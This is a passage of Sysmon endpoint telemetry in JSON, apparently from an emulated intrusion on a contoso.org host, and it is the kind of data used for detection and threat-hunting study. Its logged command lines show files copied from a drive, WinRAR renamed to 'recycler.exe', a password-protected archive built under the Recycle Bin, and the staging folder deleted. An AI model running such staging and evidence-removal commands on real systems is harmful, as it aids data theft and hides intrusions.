        {
            "action": "terminate",
            "event_id": "725ca1930a81d1ae27f66aff9d1f50b0dddb0ac13b507b33dafd625f2123e960",
            "event_type": "process",
            "event_utc": "2020-09-24T20:05:50.974Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "725ca1930a81d1ae27f66aff9d1f50b0dddb0ac13b507b33dafd625f2123e960",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 8516,
            "process_guid": "{DD483508-FC1E-5F6C-0000-00101356A902}",
            "record_number": "4100209",
            "subtype": "terminate",
            "time": "2020-09-24T20:05:50.984Z",
            "timestamp": 1600977950984,
            "uuid": "{DD483508-FC1E-5F6C-0000-00101356A902}"
        },
        {
            "action": "create",
            "command_line": "C:\\windows\\system32\\cmd.exe /C copy X:\\* .",
            "event_id": "ab556d1346e607770b624e586dbbb6c9ec7dbc5947860a3f91c5106bb4c502c8",
            "event_type": "process",
            "event_utc": "2020-09-24T20:07:37.969Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "8FAFBE3C23E2BE4D6A3C063118B9A4F2",
                "SHA256": "4C3EA4C44AAB74350355C419826B8C9E6172C3BD8F0BB5817ECF7BE50B629051"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "ab556d1346e607770b624e586dbbb6c9ec7dbc5947860a3f91c5106bb4c502c8",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "Cmd.Exe",
            "parent_command_line": "\"c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\" -Version 5.1 -s -NoLogo -NoProfile",
            "parent_exe": "powershell.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "pid": 3384,
            "ppid": 3544,
            "process_guid": "{DD483508-FC89-5F6C-0000-00102861AF02}",
            "record_number": "4100258",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T20:07:37.977Z",
            "timestamp": 1600978057977,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-FC89-5F6C-0000-00102861AF02}"
        },
        {
            "action": "access",
            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a18c4|C:\\windows\\System32\\wow64.dll+14591|C:\\windows\\System32\\wow64.dll+13d83|C:\\windows\\System32\\wow64.dll+6523|C:\\windows\\System32\\wow64cpu.dll+1923|C:\\windows\\System32\\wow64.dll+1aefc|C:\\windows\\System32\\wow64.dll+bea0|C:\\windows\\SYSTEM32\\ntdll.dll+792b8|C:\\windows\\SYSTEM32\\ntdll.dll+78e3b|C:\\windows\\SYSTEM32\\ntdll.dll+78dee|C:\\windows\\SYSTEM32\\ntdll.dll+702fc(wow64)|C:\\windows\\System32\\KERNELBASE.dll+d3a96(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189dbb(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189a6c(wow64)|C:\\Program Files\\Windows Event Reporting\\Core\\EventReporting.ApplicationFilter.Monitor.Win32.dll+31c2(wow64)|UNKNOWN(0000000071971000)|UNKNOWN(000000000C6064BB)|UNKNOWN(000000000C6065D3)|UNKNOWN(000000000C60672B)|UNKNOWN(000000000C601965)|UNKNOWN(000000000C601A87)|UNKNOWN(000000000C6071CC)|UNKNOWN(000000000C600506)|UNKNOWN(000000000C6078A8)",
            "event_id": "7d0d25fe84386082733ac7e9f5ca65c77e939b0c95d34b0dd53e7fba92927437",
            "event_type": "process",
            "event_utc": "2020-09-24T20:07:37.962Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1fffff",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "7d0d25fe84386082733ac7e9f5ca65c77e939b0c95d34b0dd53e7fba92927437",
            "image_path": "C:\\windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 3384,
            "process_guid": "{DD483508-FC89-5F6C-0000-00102861AF02}",
            "record_number": "4100259",
            "src_exe": "powershell.exe",
            "src_image_path": "c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe",
            "src_pid": "3544",
            "src_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "subtype": "access",
            "time": "2020-09-24T20:07:37.978Z",
            "timestamp": 1600978057978,
            "uuid": "{DD483508-FC89-5F6C-0000-00102861AF02}"
        },
        {
            "action": "terminate",
            "event_id": "fd98eeb9fb836b165402db9bf7ea84f3149f3a3c658ca334ea82097a81b9654b",
            "event_type": "process",
            "event_utc": "2020-09-24T20:08:31.332Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "fd98eeb9fb836b165402db9bf7ea84f3149f3a3c658ca334ea82097a81b9654b",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 3384,
            "process_guid": "{DD483508-FC89-5F6C-0000-00102861AF02}",
            "record_number": "4100302",
            "subtype": "terminate",
            "time": "2020-09-24T20:08:31.343Z",
            "timestamp": 1600978111343,
            "uuid": "{DD483508-FC89-5F6C-0000-00102861AF02}"
        },
        {
            "action": "access",
            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a18c4|C:\\windows\\System32\\wow64.dll+14591|C:\\windows\\System32\\wow64.dll+13d83|C:\\windows\\System32\\wow64.dll+6523|C:\\windows\\System32\\wow64cpu.dll+1923|C:\\windows\\System32\\wow64.dll+1aefc|C:\\windows\\System32\\wow64.dll+bea0|C:\\windows\\SYSTEM32\\ntdll.dll+792b8|C:\\windows\\SYSTEM32\\ntdll.dll+78e3b|C:\\windows\\SYSTEM32\\ntdll.dll+78dee|C:\\windows\\SYSTEM32\\ntdll.dll+702fc(wow64)|C:\\windows\\System32\\KERNELBASE.dll+d3a96(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189dbb(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189a6c(wow64)|C:\\Program Files\\Windows Event Reporting\\Core\\EventReporting.ApplicationFilter.Monitor.Win32.dll+31c2(wow64)|UNKNOWN(0000000071971000)|UNKNOWN(000000000C6064BB)|UNKNOWN(000000000C6065D3)|UNKNOWN(000000000C60672B)|UNKNOWN(000000000C601965)|UNKNOWN(000000000C601A87)|UNKNOWN(000000000C6071CC)|UNKNOWN(000000000C600506)|UNKNOWN(000000000C6078A8)",
            "event_id": "0dff130f25b2f04a3d96fcdd9841a7322152e078062ed3344f60b0b5100cec10",
            "event_type": "process",
            "event_utc": "2020-09-24T20:09:17.514Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1fffff",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "0dff130f25b2f04a3d96fcdd9841a7322152e078062ed3344f60b0b5100cec10",
            "image_path": "C:\\windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 8872,
            "process_guid": "{DD483508-FCED-5F6C-0000-0010AC54B402}",
            "record_number": "4100323",
            "src_exe": "powershell.exe",
            "src_image_path": "c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe",
            "src_pid": "3544",
            "src_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "subtype": "access",
            "time": "2020-09-24T20:09:17.521Z",
            "timestamp": 1600978157521,
            "uuid": "{DD483508-FCED-5F6C-0000-0010AC54B402}"
        },
        {
            "action": "create",
            "command_line": "C:\\windows\\system32\\cmd.exe /C dir .",
            "event_id": "8118592ffb482de28c954b3402b72fa2e19dea7473847bb16d8df7bcfc630b39",
            "event_type": "process",
            "event_utc": "2020-09-24T20:09:17.519Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "8FAFBE3C23E2BE4D6A3C063118B9A4F2",
                "SHA256": "4C3EA4C44AAB74350355C419826B8C9E6172C3BD8F0BB5817ECF7BE50B629051"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "8118592ffb482de28c954b3402b72fa2e19dea7473847bb16d8df7bcfc630b39",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "Cmd.Exe",
            "parent_command_line": "\"c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\" -Version 5.1 -s -NoLogo -NoProfile",
            "parent_exe": "powershell.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "pid": 8872,
            "ppid": 3544,
            "process_guid": "{DD483508-FCED-5F6C-0000-0010AC54B402}",
            "record_number": "4100322",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T20:09:17.521Z",
            "timestamp": 1600978157521,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-FCED-5F6C-0000-0010AC54B402}"
        },
        {
            "action": "terminate",
            "event_id": "dcf50e2f6e5c7ec7e789988b5668908bec0cf43e0d3ea9e05f8e4baa2139d9c5",
            "event_type": "process",
            "event_utc": "2020-09-24T20:09:17.639Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "dcf50e2f6e5c7ec7e789988b5668908bec0cf43e0d3ea9e05f8e4baa2139d9c5",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 8872,
            "process_guid": "{DD483508-FCED-5F6C-0000-0010AC54B402}",
            "record_number": "4100324",
            "subtype": "terminate",
            "time": "2020-09-24T20:09:17.649Z",
            "timestamp": 1600978157649,
            "uuid": "{DD483508-FCED-5F6C-0000-0010AC54B402}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "a190e584a8f6649e762d555889b80acc7d26bfa6adabffba46b9db0f1e7534f6",
            "event_type": "file",
            "event_utc": "2020-09-24T20:13:01.756Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "a190e584a8f6649e762d555889b80acc7d26bfa6adabffba46b9db0f1e7534f6",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4100466",
            "subtype": "create",
            "time": "2020-09-24T20:13:01.769Z",
            "timestamp": 1600978381769,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "start",
            "count": 10,
            "dest_fqdn": "srv-dc-11.contoso.org",
            "dest_hostname": "srv-dc-11",
            "dest_ip": "10.0.0.7",
            "dest_ipv6": "false",
            "dest_port": 389,
            "event_id": "190a5669771b6c4eec6e93e79739c263e5c9886e6ab24051e430385a46afbb54",
            "event_type": "flow",
            "event_utc": "2020-09-24T20:13:13.959Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "190a5669771b6c4eec6e93e79739c263e5c9886e6ab24051e430385a46afbb54",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4100467",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.3",
            "src_ipv6": "false",
            "src_port": 50877,
            "subtype": "start",
            "time": "2020-09-24T20:13:02.803Z",
            "timestamp": 1600978382803,
            "transport": "udp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "start",
            "count": 954,
            "dest_fqdn": "srv-sft-update-38.contoso.org",
            "dest_hostname": "srv-sft-update-38",
            "dest_ip": "10.0.0.8",
            "dest_ipv6": "false",
            "dest_port": 443,
            "event_id": "f0e62424d2fb9bd54fb2b71ef3746c49d282debac21d0819e76015214957f883",
            "event_type": "flow",
            "event_utc": "2020-09-24T20:21:13.164Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "f0e62424d2fb9bd54fb2b71ef3746c49d282debac21d0819e76015214957f883",
            "image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 2296,
            "process_guid": "{DD483508-F4D6-5F6C-0000-001059723102}",
            "record_number": "4100699",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.3",
            "src_ipv6": "false",
            "src_port": 50828,
            "subtype": "start",
            "time": "2020-09-24T20:21:02.514Z",
            "timestamp": 1600978862514,
            "transport": "tcp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-F4D6-5F6C-0000-001059723102}"
        },
        {
            "action": "create",
            "command_line": "C:\\windows\\system32\\cmd.exe /C RENAME WinRAR.exe recycler.exe",
            "event_id": "828e93ad713f50936d21b2493208fe06e34ed0aaf2ec3a3a8d68f699b6e30934",
            "event_type": "process",
            "event_utc": "2020-09-24T20:28:16.692Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "8FAFBE3C23E2BE4D6A3C063118B9A4F2",
                "SHA256": "4C3EA4C44AAB74350355C419826B8C9E6172C3BD8F0BB5817ECF7BE50B629051"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "828e93ad713f50936d21b2493208fe06e34ed0aaf2ec3a3a8d68f699b6e30934",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "Cmd.Exe",
            "parent_command_line": "\"c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\" -Version 5.1 -s -NoLogo -NoProfile",
            "parent_exe": "powershell.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "pid": 4748,
            "ppid": 3544,
            "process_guid": "{DD483508-0160-5F6D-0000-001074CDFB02}",
            "record_number": "4100889",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T20:28:16.709Z",
            "timestamp": 1600979296709,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-0160-5F6D-0000-001074CDFB02}"
        },
        {
            "action": "access",
            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a18c4|C:\\windows\\System32\\wow64.dll+14591|C:\\windows\\System32\\wow64.dll+13d83|C:\\windows\\System32\\wow64.dll+6523|C:\\windows\\System32\\wow64cpu.dll+1923|C:\\windows\\System32\\wow64.dll+1aefc|C:\\windows\\System32\\wow64.dll+bea0|C:\\windows\\SYSTEM32\\ntdll.dll+792b8|C:\\windows\\SYSTEM32\\ntdll.dll+78e3b|C:\\windows\\SYSTEM32\\ntdll.dll+78dee|C:\\windows\\SYSTEM32\\ntdll.dll+702fc(wow64)|C:\\windows\\System32\\KERNELBASE.dll+d3a96(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189dbb(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189a6c(wow64)|C:\\Program Files\\Windows Event Reporting\\Core\\EventReporting.ApplicationFilter.Monitor.Win32.dll+31c2(wow64)|UNKNOWN(0000000071971000)|UNKNOWN(000000000C6064BB)|UNKNOWN(000000000C6065D3)|UNKNOWN(000000000C60672B)|UNKNOWN(000000000C601965)|UNKNOWN(000000000C601A87)|UNKNOWN(000000000C6071CC)|UNKNOWN(000000000C600506)|UNKNOWN(000000000C6078A8)",
            "event_id": "eb659beae456440cbf0e088dd3dae6bd4bf9a146c42998fb5ff93188a057ae6e",
            "event_type": "process",
            "event_utc": "2020-09-24T20:28:16.694Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1fffff",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "eb659beae456440cbf0e088dd3dae6bd4bf9a146c42998fb5ff93188a057ae6e",
            "image_path": "C:\\windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 4748,
            "process_guid": "{DD483508-0160-5F6D-0000-001074CDFB02}",
            "record_number": "4100890",
            "src_exe": "powershell.exe",
            "src_image_path": "c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe",
            "src_pid": "3544",
            "src_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "subtype": "access",
            "time": "2020-09-24T20:28:16.710Z",
            "timestamp": 1600979296710,
            "uuid": "{DD483508-0160-5F6D-0000-001074CDFB02}"
        },
        {
            "action": "terminate",
            "event_id": "b1cac53a150d652eb9bfeef2798dafd123b35af86cd09fbb8901326302ad83ad",
            "event_type": "process",
            "event_utc": "2020-09-24T20:28:17.038Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "b1cac53a150d652eb9bfeef2798dafd123b35af86cd09fbb8901326302ad83ad",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 4748,
            "process_guid": "{DD483508-0160-5F6D-0000-001074CDFB02}",
            "record_number": "4100891",
            "subtype": "terminate",
            "time": "2020-09-24T20:28:17.040Z",
            "timestamp": 1600979297040,
            "uuid": "{DD483508-0160-5F6D-0000-001074CDFB02}"
        },
        {
            "action": "create",
            "command_line": "C:\\windows\\system32\\cmd.exe /C recycler.exe a -password .\\ms_winrecycled .",
            "event_id": "7c1f92b265032001bf472d4035cf38fcb1e5073ab2499be0bb93465f0e9be21a",
            "event_type": "process",
            "event_utc": "2020-09-24T20:32:00.116Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "8FAFBE3C23E2BE4D6A3C063118B9A4F2",
                "SHA256": "4C3EA4C44AAB74350355C419826B8C9E6172C3BD8F0BB5817ECF7BE50B629051"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "7c1f92b265032001bf472d4035cf38fcb1e5073ab2499be0bb93465f0e9be21a",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "Cmd.Exe",
            "parent_command_line": "\"c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\" -Version 5.1 -s -NoLogo -NoProfile",
            "parent_exe": "powershell.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "pid": 9544,
            "ppid": 3544,
            "process_guid": "{DD483508-0240-5F6D-0000-0010B6A30F03}",
            "record_number": "4101090",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T20:32:00.124Z",
            "timestamp": 1600979520124,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-0240-5F6D-0000-0010B6A30F03}"
        },
        {
            "action": "access",
            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a18c4|C:\\windows\\System32\\wow64.dll+14591|C:\\windows\\System32\\wow64.dll+13d83|C:\\windows\\System32\\wow64.dll+6523|C:\\windows\\System32\\wow64cpu.dll+1923|C:\\windows\\System32\\wow64.dll+1aefc|C:\\windows\\System32\\wow64.dll+bea0|C:\\windows\\SYSTEM32\\ntdll.dll+792b8|C:\\windows\\SYSTEM32\\ntdll.dll+78e3b|C:\\windows\\SYSTEM32\\ntdll.dll+78dee|C:\\windows\\SYSTEM32\\ntdll.dll+702fc(wow64)|C:\\windows\\System32\\KERNELBASE.dll+d3a96(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189dbb(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189a6c(wow64)|C:\\Program Files\\Windows Event Reporting\\Core\\EventReporting.ApplicationFilter.Monitor.Win32.dll+31c2(wow64)|UNKNOWN(0000000071971000)|UNKNOWN(000000000C6064BB)|UNKNOWN(000000000C6065D3)|UNKNOWN(000000000C60672B)|UNKNOWN(000000000C601965)|UNKNOWN(000000000C601A87)|UNKNOWN(000000000C6071CC)|UNKNOWN(000000000C600506)|UNKNOWN(000000000C6078A8)",
            "event_id": "5580b3b7a70ad23afda1c6ee59cb0ad0fb16af71b3667380ba81c13abef53e93",
            "event_type": "process",
            "event_utc": "2020-09-24T20:32:00.121Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1fffff",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "5580b3b7a70ad23afda1c6ee59cb0ad0fb16af71b3667380ba81c13abef53e93",
            "image_path": "C:\\windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 9544,
            "process_guid": "{DD483508-0240-5F6D-0000-0010B6A30F03}",
            "record_number": "4101091",
            "src_exe": "powershell.exe",
            "src_image_path": "c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe",
            "src_pid": "3544",
            "src_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "subtype": "access",
            "time": "2020-09-24T20:32:00.125Z",
            "timestamp": 1600979520125,
            "uuid": "{DD483508-0240-5F6D-0000-0010B6A30F03}"
        },
        {
            "action": "create",
            "command_line": "recycler.exe  a -password .\\ms_winrecycled .",
            "event_id": "b1913e14f299fb0ac41a0ce61bf23db9a0c00536bed6999274ec7686bf900d3d",
            "event_type": "process",
            "event_utc": "2020-09-24T20:32:00.324Z",
            "exe": "recycler.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "F413B4A2242BB60829C9A470EEA4DFB6",
                "SHA256": "C0AE6E4FC0364C021FB7E22AF4E225C100B0F75B53DDDE7A8B1E4B51E5A252C2"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "b1913e14f299fb0ac41a0ce61bf23db9a0c00536bed6999274ec7686bf900d3d",
            "image_path": "C:\\$Recycle.Bin\\MS_TRASH\\recycler.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "WinRAR.exe",
            "parent_command_line": "C:\\windows\\system32\\cmd.exe /C recycler.exe a -password .\\ms_winrecycled .",
            "parent_exe": "cmd.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "parent_process_guid": "{DD483508-0240-5F6D-0000-0010B6A30F03}",
            "pid": 10688,
            "ppid": 9544,
            "process_guid": "{DD483508-0240-5F6D-0000-0010C7B70F03}",
            "record_number": "4101092",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T20:32:00.347Z",
            "timestamp": 1600979520347,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-0240-5F6D-0000-0010C7B70F03}"
        },
        {
            "action": "terminate",
            "event_id": "d5db61866e24e9d824f306095de2d52996935d9f6e22cf1c03496698fa8143fa",
            "event_type": "process",
            "event_utc": "2020-09-24T20:32:09.878Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "d5db61866e24e9d824f306095de2d52996935d9f6e22cf1c03496698fa8143fa",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 9544,
            "process_guid": "{DD483508-0240-5F6D-0000-0010B6A30F03}",
            "record_number": "4101107",
            "subtype": "terminate",
            "time": "2020-09-24T20:32:09.891Z",
            "timestamp": 1600979529891,
            "uuid": "{DD483508-0240-5F6D-0000-0010B6A30F03}"
        },
        {
            "action": "start",
            "count": 23,
            "dest_fqdn": "srv-dc-11.contoso.org",
            "dest_hostname": "srv-dc-11",
            "dest_ip": "10.0.0.7",
            "dest_ipv6": "false",
            "dest_port": 49668,
            "event_id": "ab4d27ec417c04f699416e5db886e7712ccf12d2e15f2b46bc815144d10233e5",
            "event_type": "flow",
            "event_utc": "2020-09-24T20:38:11.282Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "ab4d27ec417c04f699416e5db886e7712ccf12d2e15f2b46bc815144d10233e5",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4101938",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.3",
            "src_ipv6": "false",
            "src_port": 52004,
            "subtype": "start",
            "time": "2020-09-24T20:38:00.511Z",
            "timestamp": 1600979880511,
            "transport": "tcp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "command_line": "C:\\windows\\system32\\cmd.exe /C rmdir .\\MS_TRASH /s /q",
            "event_id": "67f41aa22c027747d1c890a2a60feba0aebbe76a4ec6be61719e2cc14bd88ac7",
            "event_type": "process",
            "event_utc": "2020-09-24T20:43:50.870Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "8FAFBE3C23E2BE4D6A3C063118B9A4F2",
                "SHA256": "4C3EA4C44AAB74350355C419826B8C9E6172C3BD8F0BB5817ECF7BE50B629051"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "67f41aa22c027747d1c890a2a60feba0aebbe76a4ec6be61719e2cc14bd88ac7",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "Cmd.Exe",
            "parent_command_line": "\"c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\" -Version 5.1 -s -NoLogo -NoProfile",
            "parent_exe": "powershell.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "pid": 8836,
            "ppid": 3544,
            "process_guid": "{DD483508-0506-5F6D-0000-0010C6303E03}",
            "record_number": "4103032",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T20:43:50.887Z",
            "timestamp": 1600980230887,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-0506-5F6D-0000-0010C6303E03}"
        },
        {
            "action": "access",
